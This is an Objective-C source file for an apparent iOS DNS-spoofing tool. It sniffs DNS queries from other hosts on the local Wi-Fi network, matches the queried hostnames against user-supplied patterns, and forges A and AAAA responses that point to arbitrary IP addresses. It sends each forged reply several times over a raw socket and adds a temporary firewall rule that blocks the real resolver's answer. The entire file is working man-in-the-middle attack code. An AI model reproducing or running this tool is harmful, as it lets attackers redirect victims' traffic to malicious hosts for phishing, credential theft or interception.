//
//  IJTDNSpoof.m
//  IJTDNSpoof
//
//  Created by 聲華 陳 on 2015/11/24.
//
//

#import "IJTDNSpoof.h"
#import <pcap.h>
#import <sys/ioctl.h>
#import <arpa/inet.h>
#import <net/ethernet.h>
#import <netinet/ip.h>
#import <netinet/udp.h>
#import <resolv.h>
#import <IJTNetowrkStatus.h>
#import <sys/socket.h>
#import "IJTFirewall.h"
#import <pthread.h>
#import <ifaddrs.h>

//
//http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
//http://www.software7.com/blog/programmatically-query-specific-dns-servers-on-ios/
//

struct ijt_dns_header
{
    unsigned short dns_id; // identification number
    
    unsigned char dns_rd :1; // recursion desired
    unsigned char dns_tc :1; // truncated message
    unsigned char dns_aa :1; // authoritive answer
    unsigned char dns_opcode :4; // purpose of message
    unsigned char dns_qr :1; // query/response flag
    
    unsigned char dns_rcode :4; // response code
    unsigned char dns_cd :1; // checking disabled
    unsigned char dns_ad :1; // authenticated data
    unsigned char dns_z :1; // its z! reserved
    unsigned char dns_ra :1; // recursion available
    
    unsigned short dns_q_count; // number of question entries
    unsigned short dns_ans_count; // number of answer entries
    unsigned short dns_auth_count; // number of authority entries
    unsigned short dns_add_count; // number of resource entries
};

#pragma pack(push, 1)
struct R_DATA
{
    unsigned short type;
    unsigned short _class;
    unsigned int ttl;
    unsigned short data_len;
};
#pragma pack(pop)

@interface IJTDNSpoof ()

@property (nonatomic) pthread_t pthread;
@property (nonatomic) BOOL setStop;
@property (nonatomic) int sockfd;
@property (nonatomic) pcap_t *pcap;

@end

@implementation IJTDNSpoof

- (id)init {
    self = [super init];
    if(self) {
        [self open];
    }
    return self;
}


- (void)open {
    int n = 1, len, maxbuf;
    
    //open raw socket
    self.sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
    if(self.sockfd < 0)
        goto BAD;
    
    //custom ip header
    if (setsockopt(self.sockfd, IPPROTO_IP, IP_HDRINCL, &n, sizeof(n)) < 0)
        goto BAD;
    
    //enable broadcast
    n = 1;
    if (setsockopt(self.sockfd, SOL_SOCKET, SO_BROADCAST, &n, sizeof(n)) < 0)
        goto BAD;
    
    //send buffer
    len = sizeof(n);
    maxbuf = 1024*1024;
    
    if (getsockopt(self.sockfd, SOL_SOCKET, SO_SNDBUF, &n, (socklen_t *)&len) < 0)
        goto BAD;
    
    for (n += 1024; n <= maxbuf; n += 1024) {
        if (setsockopt(self.sockfd, SOL_SOCKET, SO_SNDBUF, &n, len) < 0) {
            if (errno == ENOBUFS)
                break;
            goto BAD;
        }
    }
    
    //receive buffer
    len = sizeof(n);
    maxbuf = 1024*1024;
    
    if (getsockopt(self.sockfd, SOL_SOCKET, SO_RCVBUF, &n, (socklen_t *)&len) < 0)
        goto BAD;
    
    for (n += 1024; n <= maxbuf; n += 1024) {
        if (setsockopt(self.sockfd, SOL_SOCKET, SO_RCVBUF, &n, len) < 0) {
            if (errno == ENOBUFS)
                break;
            goto BAD;
        }
    }
    
    self.errorHappened = NO;
    return;
    
BAD:
    self.errorMessage = [NSString stringWithUTF8String:strerror(errno)];
    self.errorHappened = YES;
    [self close];
    return;
}

- (void)dealloc {
    [self close];
}

- (void)close {
    if(_sockfd >= 0) {
        close(_sockfd);
        _sockfd = -1;
    }
}

- (void)readPattern: (NSString *)string {
    _paternArray = [[NSMutableArray alloc] init];
    NSArray *array = [string componentsSeparatedByString:@"\n"];
    for(NSString *s in array) {
        NSArray *subArray = [s componentsSeparatedByString:@" "];
        if(subArray.count != 3) {
            continue;
        }
        NSMutableString *hostname = [subArray objectAtIndex:0];
        NSString *type = [subArray objectAtIndex:1];
        NSString *ipAddress = [subArray objectAtIndex:2];
        NSString *origHostname = [subArray objectAtIndex:0];
        
        if(([type isEqualToString:@"A"] && ![IJTDNSpoof checkIpv4Address:ipAddress]) ||
           ([type isEqualToString:@"AAAA"] && ![IJTDNSpoof checkIpv6Address:ipAddress])) {
            continue;
        }
        
        hostname = [NSMutableString stringWithString:[hostname stringByReplacingOccurrencesOfString:@"." withString:@"\\."]];
        [hostname insertString:@"^" atIndex:0];
        [hostname insertString:@"$" atIndex:hostname.length];
        hostname = [NSMutableString stringWithString:[hostname stringByReplacingOccurrencesOfString:@"*" withString:@"\\S*"]];
        
        NSMutableDictionary *dict = [[NSMutableDictionary alloc] init];
        [dict setObject:hostname forKey:@"Hostname"];
        [dict setObject:ipAddress forKey:@"IpAddress"];
        [dict setObject:type forKey:@"Type"];
        [dict setObject:origHostname forKey:@"OriginHostname"];
        
        [_paternArray addObject:dict];
    }
    
    NSSet *set = [NSSet setWithArray:_paternArray];
    _paternArray = [NSMutableArray arrayWithArray:[set allObjects]];
}

+ (NSUInteger)checkPattern: (NSString *)string {
    NSMutableArray *paternArray = [[NSMutableArray alloc] init];
    NSArray *array = [string componentsSeparatedByString:@"\n"];
    for(NSString *s in array) {
        NSArray *subArray = [s componentsSeparatedByString:@" "];
        if(subArray.count != 3) {
            continue;
        }
        NSMutableString *hostname = [subArray objectAtIndex:0];
        NSString *type = [subArray objectAtIndex:1];
        NSString *ipAddress = [subArray objectAtIndex:2];
        NSString *origHostname = [subArray objectAtIndex:0];
        
        if(([type isEqualToString:@"A"] && ![IJTDNSpoof checkIpv4Address:ipAddress]) ||
           ([type isEqualToString:@"AAAA"] && ![IJTDNSpoof checkIpv6Address:ipAddress])) {
            continue;
        }
        
        hostname = [NSMutableString stringWithString:[hostname stringByReplacingOccurrencesOfString:@"." withString:@"\\."]];
        [hostname insertString:@"^" atIndex:0];
        [hostname insertString:@"$" atIndex:hostname.length];
        hostname = [NSMutableString stringWithString:[hostname stringByReplacingOccurrencesOfString:@"*" withString:@"\\S*"]];
        
        NSMutableDictionary *dict = [[NSMutableDictionary alloc] init];
        [dict setObject:hostname forKey:@"Hostname"];
        [dict setObject:ipAddress forKey:@"IpAddress"];
        [dict setObject:type forKey:@"Type"];
        [dict setObject:origHostname forKey:@"OriginHostname"];
        
        [paternArray addObject:dict];
    }
    
    NSSet *set = [NSSet setWithArray:paternArray];
    return [[set allObjects] count];
}

- (int)openSniffer {
    //open pcap handle
    char errbuf[256];
    struct bpf_program bpf_filter;
    bpf_u_int32 net_mask;
    bpf_u_int32 net_ip;
    
    _pcap = pcap_open_live("en0", 65535, 1, 1, errbuf);
    if(!_pcap) {
        self.errorMessage = [NSString stringWithUTF8String:errbuf];
        goto BAD;
    }
    if(-1 == pcap_lookupnet("en0", &net_ip, &net_mask, errbuf)) {
        self.errorMessage = [NSString stringWithUTF8String:errbuf];
        goto BAD;
    }
    
    if(-1 == pcap_compile(_pcap,
                          &bpf_filter,
                          [[NSString stringWithFormat:@"src host not %@ && udp dst port 53 && ether dst %@", currentIPAddress(), [IJTNetowrkStatus wifiMacAddress]] UTF8String],
                          1,
                          net_ip)) {
        self.errorMessage = [NSString stringWithUTF8String:pcap_geterr(_pcap)];
        goto BAD;
    }
    
    if(-1 == pcap_setfilter(_pcap, &bpf_filter)) {
        self.errorMessage = [NSString stringWithUTF8String:pcap_geterr(_pcap)];
        goto BAD;
    }
    pcap_freecode(&bpf_filter);
    
    return 0;
BAD:
    if(_pcap) {
        pcap_close(_pcap);
    }
    _pcap = NULL;
    return -1;
}

- (int)startRegisterTarget: (id)target
                  selector: (SEL)selector
                    object: (id)object {
    
    _setStop = NO;
    struct timeval recvTime;
    DNSpoofCallback dnspoofcallback = NULL;
    
    if(target && selector) {
        dnspoofcallback = (DNSpoofCallback)[target methodForSelector:selector];
    }
    
    while(1) {
        struct pcap_pkthdr *header = NULL;
        const u_char *content = NULL;
        int ret =
        pcap_next_ex(_pcap, &header, &content);
        
        if(ret == 1) {
            
            gettimeofday(&recvTime, NULL);
            
            struct ip *ip = (struct ip *)(content + ETHER_HDR_LEN);
            struct udphdr *udp = (struct udphdr *)(content + ETHER_HDR_LEN + (ip->ip_hl << 2));
            struct ijt_dns_header *dns = (struct ijt_dns_header *)(content + ETHER_HDR_LEN + (ip->ip_hl << 2) + 8);
            int dnsQuestionLength = ntohs(udp->uh_ulen) - 8 - sizeof(struct ijt_dns_header);
            NSString *queryHostname = @"";
            ns_type type;
            NSString *ipAddress = nil;
            
            char *buffer = (char *)(content + ETHER_HDR_LEN + (ip->ip_hl << 2) + 8 + sizeof(struct ijt_dns_header));
            
            if(!buffer) {
                continue;
            }
            
            queryHostname = [IJTDNSpoof dnsNameToString:buffer];
            type = *(buffer + queryHostname.length + 3);
            
            if(type != ns_t_a && type != ns_t_aaaa) {
                continue;
            }
            
            for(NSDictionary *dict in _paternArray) {
                
                NSString *hostname = [dict valueForKey:@"Hostname"];
                NSError  *error  = NULL;
                
                NSRegularExpression *regex = [NSRegularExpression
                                              regularExpressionWithPattern:hostname
                                              options:NSRegularExpressionCaseInsensitive
                                              error:&error];
                
                NSTextCheckingResult *match = [regex firstMatchInString:queryHostname
                                                                options:0
                                                                  range:NSMakeRange(0, [queryHostname length])];
                
                BOOL isMatch = match != nil;
                
                if(isMatch) {
                    NSString *type2 = [dict valueForKey:@"Type"];
                    if(type == ns_t_a && [type2 isEqualToString:@"A"]) {
                        ipAddress = [dict valueForKey:@"IpAddress"];
                    }
                    else if(type == ns_t_aaaa && [type2 isEqualToString:@"AAAA"]) {
                        ipAddress = [dict valueForKey:@"IpAddress"];
                    }
                }
                if(ipAddress != nil) {
                    break;
                }
            }
            
            if(ipAddress == nil) {
                continue;
            }//not match
            
            pthread_t thread;
            pthread_create(&thread, NULL, firewall, ip);
            
            char sendBuffer[65535] = {};
            struct ip *sendip = (struct ip *)sendBuffer;
            struct udphdr *sendudp = (struct udphdr *)(sendBuffer + sizeof(struct ip));
            struct ijt_dns_header *senddns = (struct ijt_dns_header *)(sendBuffer + sizeof(struct ip) + 8);
            char *answerPointer = (sendBuffer + sizeof(struct ip) + 8 + sizeof(struct ijt_dns_header));
            
            
            //ip
            sendip->ip_v = IPVERSION;
            sendip->ip_hl = sizeof(struct ip) >> 2;
            sendip->ip_tos = 0;
            sendip->ip_id = arc4random();
            sendip->ip_ttl = 255;
            sendip->ip_p = IPPROTO_UDP;
            sendip->ip_src.s_addr = ip->ip_dst.s_addr;
            sendip->ip_dst.s_addr = ip->ip_src.s_addr;
            
            //udp
            sendudp->uh_dport = udp->uh_sport;
            sendudp->uh_sport = udp->uh_dport;
            
            senddns->dns_id = dns->dns_id;
            senddns->dns_qr = 1; //This is a respone
            senddns->dns_opcode = dns->dns_opcode; //This is a standard query
            senddns->dns_aa = dns->dns_aa; //Not Authoritative
            senddns->dns_tc = dns->dns_tc; //This message is not truncated
            senddns->dns_rd = dns->dns_rd ; //Recursion Desired
            senddns->dns_ra = 1; //Recursion not available! hey we dont have it (lol)
            senddns->dns_z = dns->dns_z;
            senddns->dns_ad = dns->dns_ad;
            senddns->dns_cd = dns->dns_cd;
            senddns->dns_rcode = dns->dns_rcode;
            senddns->dns_q_count = dns->dns_q_count; //we have only 1 question
            senddns->dns_ans_count = ntohs(1);
            senddns->dns_auth_count = 0;
            senddns->dns_add_count = 0;
            
            
            //copy query
            memcpy(answerPointer, content + ETHER_HDR_LEN + (ip->ip_hl << 2) + 8 + sizeof(struct ijt_dns_header), dnsQuestionLength);
            answerPointer += dnsQuestionLength;
            *answerPointer = 0xc0;
            answerPointer++;
            *answerPointer = 0x0c;
            answerPointer++;
            struct R_DATA *recordData = (struct R_DATA *)answerPointer;
            int answerLength = 12;
            recordData->type = htons(type);
            recordData->_class = htons(0x0001);
            recordData->ttl = htonl(60*60); //1 hour
            if(type == ns_t_a) {
                answerLength += 4;
                recordData->data_len = htons(4);
            }
            else if(type == ns_t_aaaa) {
                answerLength += 16;
                recordData->data_len = htons(16);
            }
            answerPointer += sizeof(struct R_DATA);
            char spoofIpAddress[256];
            memset(spoofIpAddress, 0, sizeof(spoofIpAddress));
            inet_pton(type == ns_t_a ? AF_INET : AF_INET6, [ipAddress UTF8String], &spoofIpAddress);
            memcpy(answerPointer, &spoofIpAddress, type == ns_t_a ? 4 : 16);
            
            sendip->ip_len = 20 + 8 + sizeof(struct ijt_dns_header) + dnsQuestionLength + answerLength;
            sendip->ip_sum = checksum((u_short *)ip, ip->ip_hl << 2);
            sendudp->uh_ulen = htons(8 + sizeof(struct ijt_dns_header) + dnsQuestionLength + answerLength);
            
            struct sockaddr_in sin;
            
            memset(&sin, 0, sizeof(sin));
            sin.sin_addr.s_addr = sendip->ip_dst.s_addr;
            sin.sin_family = AF_INET;
            sin.sin_len = sizeof(sin);
            
            for(int i = 0 ; i < 5 ; i++) {
                if(sendto(_sockfd, sendBuffer, sendip->ip_len, 0, (struct sockaddr *)&sin, (socklen_t)sizeof(sin)) < 0) {
                    self.errorMessage = [NSString stringWithUTF8String:strerror(errno)];
                    break;
                }
            }
            if(dnspoofcallback) {
                char ntop_buf[256];
                inet_ntop(AF_INET, &sendip->ip_dst.s_addr, ntop_buf, sizeof(ntop_buf));
                NSString *targetIPAddress = [NSString stringWithUTF8String:ntop_buf];
                dnspoofcallback(target, selector, targetIPAddress, queryHostname, ipAddress, type, recvTime, object);
            }
            
            
        }//end if read
        else if(ret == -1) {
            self.errorMessage = [NSString stringWithUTF8String:pcap_geterr(_pcap)];
            errno = 0;
            break;
        }//end if error
        if(_setStop) {
            break;
        }//end if
    }//end while

    if(_pcap) {
        pcap_close(_pcap);
        _pcap = NULL;
    }//end if
    self.errorHappened = NO;
    return 0;
}

- (void)stop {
    _setStop = YES;
}

void *firewall(void *arg) {
    struct ip *ip = (struct ip *)arg;
    struct udphdr *udp = (struct udphdr *)((char *)arg + (ip->ip_hl << 2));
    
    char ntop_buf[256];
    inet_ntop(AF_INET, &ip->ip_src, ntop_buf, sizeof(ntop_buf));
    NSString *sourceIp = [NSString stringWithUTF8String:ntop_buf];
    inet_ntop(AF_INET, &ip->ip_dst, ntop_buf, sizeof(ntop_buf));
    NSString *destinationIp = [NSString stringWithUTF8String:ntop_buf];
    u_int16_t dport = ntohs(udp->uh_dport);
    u_int16_t sport = ntohs(udp->uh_sport);
    IJTFirewall *fw = [[IJTFirewall alloc] init];
    if(fw.errorHappened) {
        pthread_exit(NULL);
    }
    
    [fw addTCPOrUDPRuleAtInterface:@"en0"
                                op:IJTFirewallOperatorBlock
                               dir:IJTFirewallDirectionIn
                             proto:IJTFirewallProtocolUDP
                            family:AF_INET
                           srcAddr:destinationIp
                           dstAddr:sourceIp
                           srcMask:@"255.255.255.255"
                           dstMask:@"255.255.255.255"
                           srcPort:dport
                           dstPort:sport
                          tcpFlags:0
                      tcpFlagsMask:0
                         keepState:NO
                             quick:YES];
    
    sleep(3);
    [fw deleteTCPOrUDPRuleAtInterface:@"en0"
                                   op:IJTFirewallOperatorBlock
                                  dir:IJTFirewallDirectionIn
                                proto:IJTFirewallProtocolUDP
                               family:AF_INET
                              srcAddr:destinationIp
                              dstAddr:sourceIp
                              srcMask:@"255.255.255.255"
                              dstMask:@"255.255.255.255"
                              srcPort:dport
                              dstPort:sport
                             tcpFlags:0
                         tcpFlagsMask:0
                            keepState:NO
                                quick:YES];
    
    [fw close];
    fw = nil;
    
    pthread_exit(NULL);
}

+ (NSString *)dnsNameToString: (char *)rawdata {
    NSMutableString *result = [NSMutableString stringWithFormat:@""];
    for(int i = 0 ; ; i++) {
        int length = rawdata[i];
        
        if(length == 0)
            break;
        while(length--) {
            i++;
            [result appendString:[NSString stringWithFormat:@"%c", rawdata[i]]];
        }
        [result appendString:@"."];
    }
    
    return [result substringWithRange:NSMakeRange(0, result.length-1)];
}

+ (BOOL)checkIpv4Address: (NSString *)ipAddress {
    NSArray *array = [ipAddress componentsSeparatedByString:@"."];
    struct in_addr inaddr;
    if(array.count != 4)
        return NO;
    
    for(int i = 0 ; i < array.count ; i++) {
        NSString *string = array[i];
        if(string.length <= 0)
            return NO;
        NSScanner *scanner = [[NSScanner alloc] initWithString:string];
        int byte;
        [scanner scanInt:&byte];
        if(byte < 0 || byte > 256)
            return NO;
    }
    
    if(inet_pton(AF_INET, [ipAddress UTF8String], &inaddr) == -1)
        return NO;
    
    return YES;
}

+ (BOOL)checkIpv6Address: (NSString *)ipAddress {
    struct in6_addr inaddr;
    
    if([ipAddress containsString:@"."])
        return NO;
    
    if(inet_pton(AF_INET6, [ipAddress UTF8String], &inaddr) == -1)
        return NO;
    return YES;
}

static u_int16_t checksum(u_int16_t *data, int len) {
    u_int32_t sum = 0;
    
    for (; len > 1; len -= 2) {
        sum += *data++;
        if (sum & 0x80000000)
            sum = (sum & 0xffff) + (sum >> 16);
    }
    
    if (len == 1) {
        u_int16_t i = 0;
        *(u_char*) (&i) = *(u_char *) data;
        sum += i;
    }
    
    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);
    
    return ~sum;
}

static NSString *currentIPAddress() {
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    NSString *address = nil;
    
    // retrieve the current interfaces - returns 0 on success
    if(!getifaddrs(&interfaces)) {
        // Loop through linked list of interfaces
        temp_addr = interfaces;
        while(temp_addr != NULL) {
            sa_family_t sa_type = temp_addr->ifa_addr->sa_family;
            if(sa_type == AF_INET) {
                NSString *name = [NSString stringWithUTF8String:temp_addr->ifa_name];
                NSString *addr = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)]; // pdp_ip0
                //NSLog(@"NAME: \"%@\" addr: %@", name, addr); // see for yourself
                
                if([name isEqualToString:@"en0"]) {
                    // Interface is the wifi connection on the iPhone
                    address = addr;
                    break;
                }
            }
            temp_addr = temp_addr->ifa_next;
        }
        // Free memory
        freeifaddrs(interfaces);
    }
    
    if(address == nil)
        errno = EFAULT; /* Bad address */
    
    return address;
}




@end
